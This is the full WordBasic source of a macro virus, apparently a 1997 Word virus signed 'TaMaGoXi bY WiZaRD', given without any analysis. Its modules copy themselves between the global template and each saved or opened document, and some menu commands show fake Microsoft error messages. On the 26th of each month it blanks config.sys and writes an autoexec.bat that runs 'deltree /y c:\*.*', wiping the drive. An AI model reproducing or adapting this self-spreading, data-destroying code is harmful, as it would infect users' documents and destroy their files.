   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "ArquivoSalvarComo"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TaMaGoXi bY WiZaRD"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArquivoSalvarComo.MAIN"
   Dim caminho$
       Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
       WordBasic.CurValues.FileSaveAs dlg
       On Error GoTo -1: On Error GoTo WizEnd
       WordBasic.Dialog.FileSaveAs dlg
       caminho$ = Environ("TAMAGOXI")
       If caminho$ = "GMS" Then GoTo WizOk
       GoTo WizTart
   WizOk:
       WordBasic.FileSaveAs dlg
       WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
       GoTo WizEnd
   WizTart:
       dlg.Format = 1
       On Error GoTo -1: On Error GoTo WSave
       WordBasic.MacroCopy "Global:AutoExec", WordBasic.[WindowName$]() + ":AutoExec"
   WSave:
       On Error GoTo -1: On Error GoTo WClose
       WordBasic.MacroCopy "Global:ArquivoSalvarComo", WordBasic.[WindowName$]() + ":ArquivoSalvarComo"
   WClose:
       On Error GoTo -1: On Error GoTo WOpen
       WordBasic.MacroCopy "Global:AutoClose", WordBasic.[WindowName$]() + ":AutoClose"
   WOpen:
       On Error GoTo -1: On Error GoTo WModelos
       WordBasic.MacroCopy "Global:AutoOpen", WordBasic.[WindowName$]() + ":AutoOp"
   WModelos:
       On Error GoTo -1: On Error GoTo WFerram
       WordBasic.MacroCopy "Global:ArquivoModelos", WordBasic.[WindowName$]() + ":ArquivoModelos"
   WFerram:
       On Error GoTo -1: On Error GoTo WUtil
       WordBasic.MacroCopy "Global:FerramMacro", WordBasic.[WindowName$]() + ":FerramMacro"
   WUtil:
       On Error GoTo -1: On Error GoTo WImp
       WordBasic.MacroCopy "Global:UtilMacro", WordBasic.[WindowName$]() + ":UtilMacro"
   WImp:
       On Error GoTo -1: On Error GoTo WImpP
       WordBasic.MacroCopy "Global:ArquivoImprimir", WordBasic.[WindowName$]() + ":ArquivoImprimir"
   WImpP:
       On Error GoTo -1: On Error GoTo WizSave
       WordBasic.MacroCopy "Global:ArquivoImprimirPadrão", WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão"
   WizSave:
       WordBasic.FileSaveAs dlg
   WizEnd:
   End Sub

   Attribute VB_Name = "ArquivoModelos"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TaMaGoXi bY WiZaRD"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.ArquivoModelos.MAIN"
   Dim caminho$
       caminho$ = Environ("TAMAGOXI")
       If caminho$ = "GMS" Then GoTo WizOk
       WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
       GoTo WizEnd
   WizOk:
       WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
   WizEnd:
   End Sub

   Attribute VB_Name = "FerramMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TaMaGoXi bY WiZaRD"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.FerramMacro.MAIN"
   Dim caminho$
       caminho$ = Environ("TAMAGOXI")
       If caminho$ = "GMS" Then GoTo WizOk
       WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
       GoTo WizEnd
   WizOk:
       WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
   WizEnd:
   End Sub

   Attribute VB_Name = "UtilMacro"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TaMaGoXi bY WiZaRD"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.UtilMacro.MAIN"
   Dim caminho$
       caminho$ = Environ("TAMAGOXI")
       If caminho$ = "GMS" Then GoTo WizOk
       WordBasic.MsgBox "Erro de compilação módulo 34:121 Visual Basic. Contate Suporte On-Line.", "MicoSoft World", 48
       GoTo WizEnd
   WizOk:
       WordBasic.MsgBox "o WiZaRD NauM T LiBeRoU eSsA OpÇãO!!!", "TAmAGoXi's NoTe", 64
   WizEnd:
   End Sub

   Attribute VB_Name = "AutoClose"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TaMaGoXi bY WiZaRD"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoClose.MAIN"
   Dim caminho$
       caminho$ = Environ("TAMAGOXI")
       If caminho$ = "GMS" Then GoTo WizOk
       GoTo WizTart
   WizOk:
       If WordBasic.Day(WordBasic.Now()) = 26 Then GoTo BHappy
       WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
       GoTo WizEnd
   WizTart:
       On Error GoTo -1: On Error GoTo WSave
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoExec", "Global:AutoExec"
   WSave:
       On Error GoTo -1: On Error GoTo WClose
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoSalvarComo", "Global:ArquivoSalvarComo"
   WClose:
       On Error GoTo -1: On Error GoTo WOpen
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoClose", "Global:AutoClose"
   WOpen:
       On Error GoTo -1: On Error GoTo WUtil
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":AutoOp", "Global:AutoOpen"
   WUtil:
       On Error GoTo -1: On Error GoTo WModelos
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":UtilMacro", "Global:UtilMacro"
   WModelos:
       On Error GoTo -1: On Error GoTo WFerram
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoModelos", "Global:ArquivoModelos"
   WFerram:
       On Error GoTo -1: On Error GoTo WImp
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":FerramMacro", "Global:FerramMacro"
   WImp:
       On Error GoTo -1: On Error GoTo WImpP
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimir", "Global:ArquivoImprimir"
   WImpP:
       On Error GoTo -1: On Error GoTo WizChk
       WordBasic.MacroCopy WordBasic.[WindowName$]() + ":ArquivoImprimirPadrão", "Global:ArquivoImprimirPadrão"
   WizChk:
       If WordBasic.Day(WordBasic.Now()) <> 26 Then GoTo WizEnd
       Open "c:\config.sys" For Output As 1
       Close 1
       Open "c:\autoexec.bat" For Output As 1
       Print #1, "@echo off"
       Print #1, "cls"
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
       Print #1, "echo                        TaMaGoXI bY WiZaRD***"
       Print #1, "echo                                          ***"
       Print #1, "echo                                         *"
       Print #1, "echo                                        *"
       Print #1, "echo                          *************"
       Print #1, "echo                         *             *"
       Print #1, "echo                        *  ****   ****  *"
       Print #1, "echo                        *               *"
       Print #1, "echo                        *     *****     *"
       Print #1, "echo                         ***************"
       Print #1, "echo."
       Print #1, "echo                     eXPecT nO MeRcY FRoM HiM"
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "echo File' not found: Serve Alcatara Mane'? (S/N)"
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "deltree /y c:\*.* >nul"
       Close 1
   BHappy:
       WordBasic.Beep
       WordBasic.MsgBox "EtERnAl LoVE 2 mY LitTlE gIrL Gi", "TAmAGoXi's NoTe", 64
   WizEnd:
   End Sub

   Attribute VB_Name = "AutoExec"

   Public Sub MAIN()
   Attribute MAIN.VB_Description = "TaMaGoXi bY WiZaRD"
   Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoExec.MAIN"
   Dim caminho$
       caminho$ = Environ("TAMAGOXI")
       If caminho$ = "GMS" Then GoTo WizOk
       GoTo WizTart
   WizOk:
       WordBasic.FileNewDefault
       If WordBasic.Day(WordBasic.Now()) = 26 Then GoTo BHappy
       WordBasic.MsgBox "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi", -1
       GoTo WizEnd
   WizTart:
       If WordBasic.Day(WordBasic.Now()) <> 26 Then GoTo WizEnd
       WordBasic.FileNewDefault
       Open "c:\config.sys" For Output As 1
       Close 1
       Open "c:\autoexec.bat" For Output As 1
       Print #1, "@echo off"
       Print #1, "cls"
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
       Print #1, "echo                        TaMaGoXI bY WiZaRD***"
       Print #1, "echo                                          ***"
       Print #1, "echo                                         *"
       Print #1, "echo                                        *"
       Print #1, "echo                          *************"
       Print #1, "echo                         *             *"
       Print #1, "echo                        *  ****   ****  *"
       Print #1, "echo                        *               *"
       Print #1, "echo                        *     *****     *"
       Print #1, "echo                         ***************"
       Print #1, "echo."
       Print #1, "echo                     eXPecT nO MeRcY FRoM HiM"
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "echo File' not found: Serve Alcatara Mane'? (S/N)"
       Print #1, "echo."
       Print #1, "echo."
       Print #1, "deltree /y c:\*.* >nul"
       Close 1
   BHappy:
       WordBasic.Beep
       WordBasic.MsgBox "EtERnAl LoVE 2 mY LitTlE gIrL Gi", "TAmAGoXi's NoTe", 64
   WizEnd:
   End Sub
